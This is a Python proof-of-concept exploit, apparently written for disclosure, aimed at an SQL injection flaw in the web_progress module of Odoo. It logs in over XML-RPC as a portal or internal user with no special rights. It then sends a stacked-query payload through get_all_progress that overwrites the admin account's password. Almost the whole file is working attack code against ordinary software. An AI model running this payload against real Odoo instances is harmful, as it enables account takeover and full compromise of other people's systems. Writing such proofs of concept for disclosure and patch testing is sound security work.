# Exploit
# Copyright (c) 2023 Lucas Visintin
# Odoo Module: web_progress
# SQL injection vulnerability in web_progress/models/web_progress.py:WebProgress::get_all_progress(recency)
# Callable from ExternalAPI since public method

import xmlrpc.client

url = 'http://localhost:8069'
db = 'odoodb'

# User can be Portal or Internal User with no specific permission
username = 'lucas'
password = 'lucas'


common = xmlrpc.client.ServerProxy('{}/xmlrpc/2/common'.format(url))
print(common.version())
uid = common.authenticate(db, username, password, {})


models = xmlrpc.client.ServerProxy('{}/xmlrpc/2/object'.format(url), allow_none=True)
res = models.execute_kw(db, uid, password, 'web.progress', 'get_all_progress', ["1 SECOND' GROUP BY code; UPDATE res_users SET password='whatever' WHERE login='admin'; SELECT code, array_agg(state) FROM web_progress WHERE create_date > timezone('utc', now()) - INTERVAL '1 "])

print(res)

